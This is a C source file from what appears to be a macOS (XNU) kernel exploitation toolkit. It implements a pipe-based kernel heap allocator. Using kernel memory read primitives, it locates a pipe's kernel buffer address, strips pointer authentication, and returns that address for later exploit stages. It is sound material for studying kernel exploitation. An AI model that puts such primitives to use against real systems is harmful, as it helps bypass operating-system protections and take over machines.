//
//  allocator_pipe.c
//  xe
//
//  Created by admin on 11/22/21.
//

#include <assert.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/errno.h>

#include "allocator/pipe.h"
#include "xnu/proc.h"
#include "util/ptrauth.h"
#include "memory/kmem.h"
#include "util/assert.h"
#include "util/log.h"

#include "macos_params.h"


struct xe_allocator_pipe {
    int fd0;
    int fd1;
};

int xe_allocator_pipe_allocate(size_t size, xe_allocator_pipe_t* allocator_out, uintptr_t* buffer_ptr_out) {
    if (size > 4 * 16384) {
        return E2BIG;
    }
    
    int fds[2];
    if (pipe(fds)) {
        return errno;
    }
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    uintptr_t pipe;
    int error = xe_xnu_proc_find_fd_data(proc, fds[0], &pipe);
    if (error) {
        return error;
    }
    
    char* temp = malloc(size);
    if (write(fds[1], temp, size) != size) {
        free(temp);
        return errno;
    }
    free(temp);
    
    uintptr_t buffer = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(pipe, TYPE_PIPEBUF_MEM_BUFFER_OFFSET)));
    uint buffer_size = xe_kmem_read_uint32(KMEM_OFFSET(pipe, TYPE_PIPEBUF_MEM_SIZE_OFFSET));
    xe_assert(buffer_size >= size);
    xe_log_debug("pipe allocator allocated entry size: %d", buffer_size);
    
    xe_allocator_pipe_t allocator = (xe_allocator_pipe_t)malloc(sizeof(struct xe_allocator_pipe));
    allocator->fd0 = fds[0];
    allocator->fd1 = fds[1];
    *allocator_out = allocator;
    *buffer_ptr_out = buffer;
    
    return 0;
}

int xe_allocator_pipe_destroy(xe_allocator_pipe_t* pipe) {
    if (pipe == NULL || *pipe == NULL) {
        return EINVAL;
    }
    
    close((*pipe)->fd0);
    close((*pipe)->fd1);
    free(*pipe);
    return 0;
}